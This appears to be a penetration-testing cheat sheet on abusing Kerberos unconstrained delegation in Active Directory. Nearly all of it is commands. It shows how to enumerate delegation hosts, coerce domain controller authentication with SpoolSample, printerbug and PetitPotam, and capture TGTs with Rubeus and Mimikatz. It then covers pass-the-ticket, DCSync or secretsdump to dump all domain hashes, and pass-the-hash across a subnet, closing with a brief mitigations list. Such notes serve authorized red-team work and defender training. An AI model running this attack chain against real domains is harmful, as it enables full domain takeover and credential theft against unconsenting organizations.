---
tags:
  - Active_Directory
  - Advanced
  - Delegation_Abuse
  - Impacket
  - Kerberos
  - Lateral_Movement
  - Privilege_Escalation
  - Rubeus
  - Windows
---

## Unconstrained Delegation Theory
resources: [HackTricks - Kerberos Delegation](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/kerberos-delegation.html)

> [!info] Unconstrained delegation allows service to impersonate any user to any service. Service receives user's TGT, can request TGS for any service.

> [!important] **Requirements:**
> - Compromise of unconstrained delegation machine (non-DC)
> - Ability to coerce DC authentication (**PrinterBug**, **PetitPotam**)
> - Network access to DC (port 88)

### How Unconstrained Delegation Works
> [!tip] Delegation flow:
> 1. User authenticates to service with unconstrained delegation
> 2. KDC includes user's TGT in service ticket
> 3. Service extracts and stores user's TGT
> 4. Service can use TGT to access any resource as that user

### Security Risk
> [!danger] If attacker compromises unconstrained delegation server, they can steal TGTs of any user who connects and impersonate them anywhere.

## Find Unconstrained Delegation Computers

### BloodHound Query
```cypher
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name
```

### PowerView Enumeration [Remote]
```powershell
Get-DomainComputer -Unconstrained | Select-Object name,dnshostname
```

```powershell
Get-NetComputer -Unconstrained
```

### Active Directory Module [Remote]
```powershell
Get-ADComputer -Filter {TrustedForDelegation -eq $true}
```

### LDAP Search [Local]
```bash
ldapsearch -x -H ldap://<DC-IP> -D "<User>@<Domain>" -w "<Password>" -b "DC=<Domain>,DC=<TLD>" "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))"
```

### NetExec Enumeration [Local]
```bash
nxc ldap <DC_IP> -u <User> -p <Pass> --trusted-for-delegation
```

### [Alternate] Impacket
```bash
impacket-findDelegation <Domain>/<User>:<Pass> -dc-ip <DC_IP>
```

### [Alternate] Find All Delegation Types
```bash
nxc ldap <DC_IP> -u <User> -p '<Pass>' --find-delegation
```

### [Alternate] nxc_enum
```bash
python -m nxc_enum <DC_IP> -u '<User>' -p '<Pass>' --delegation
```

### [Alternate] Hackles (BloodHound)
```bash
python -m hackles -u neo4j -p '<Neo4jPassword>' --unconstrained
```

## Exploiting Unconstrained Delegation

> [!important] **Step 1** - Compromise the unconstrained delegation machine

### Step 2: Monitor for Incoming TGTs [Remote]
```cmd
Rubeus.exe monitor /interval:5 /filteruser:<TargetUser>
```

```powershell
# Monitor for DC machine account
Rubeus.exe monitor /interval:5 /filteruser:DC01$ /nowrap
```

### Step 3: Capture TGT via Printer Bug [Remote]
> [!tip] Force target to authenticate to compromised server.

```cmd
# On attacker's unconstrained delegation server
Rubeus.exe monitor /interval:5

# Trigger authentication from DC
SpoolSample.exe <DC> <UnconstDelegServer>
```

```bash
printerbug.py <Domain>/<User>:<Pass>@<DC_IP> <CompromisedHost>
```

#### PetitPotam (EFSRPC) [alternative]
```bash
python3 PetitPotam.py <UnconstServer> <DC>
```

### Step 4: Extract TGTs with Mimikatz [Remote] [alternative]
```cmd
mimikatz.exe
sekurlsa::tickets /export
```

### Step 5: Pass-the-Ticket with Captured TGT [Remote]
```cmd
Rubeus.exe ptt /ticket:<Base64Ticket>
```

```cmd
mimikatz.exe
kerberos::ptt <TicketFile>.kirbi
```

## Domain Controller Impersonation

### Coerce DC Authentication
> [!important] Force DC to authenticate and capture its TGT.

#### SpoolSample (Print Spooler) [Remote]
```cmd
SpoolSample.exe <DC> <UnconstServer>
```

#### PetitPotam (EFSRPC) [Remote]
```bash
python3 PetitPotam.py <UnconstServer> <DC>
```

### Use DC TGT for DCSync [Remote]
```cmd
# Import captured DC TGT
Rubeus.exe ptt /ticket:<DCBase64Ticket>

# DCSync
mimikatz.exe
lsadump::dcsync /domain:<Domain> /user:Administrator
```

```bash
# Linux
export KRB5CCNAME=DC01$.ccache
impacket-secretsdump -k -no-pass <DC_FQDN>
```

```powershell
# Windows with Mimikatz
.\mimikatz.exe "lsadump::dcsync /domain:<Domain> /all /csv" "exit"
```

### Validate Extracted Hashes
```bash
nxc smb <DC_IP> -u Administrator -H '<NTLMHash>' -d <Domain>
```

```bash
# Full domain access
nxc smb 192.168.1.0/24 -u Administrator -H '<NTLMHash>' -d <Domain>
```

## Full Attack Chain
```text
1. Compromise server with unconstrained delegation
2. Monitor for TGTs: Rubeus.exe monitor /interval:5
3. Coerce DC: SpoolSample.exe <DC> <CompromisedServer>
4. Capture DC machine account TGT
5. Import TGT: Rubeus.exe ptt /ticket:<Ticket>
6. DCSync: mimikatz lsadump::dcsync /all
```

## Mitigations
> [!info] Defensive measures:
> - Disable unconstrained delegation where possible
> - Use constrained delegation instead
> - Add sensitive accounts to "Protected Users" group
> - Mark accounts as "Account is sensitive and cannot be delegated"
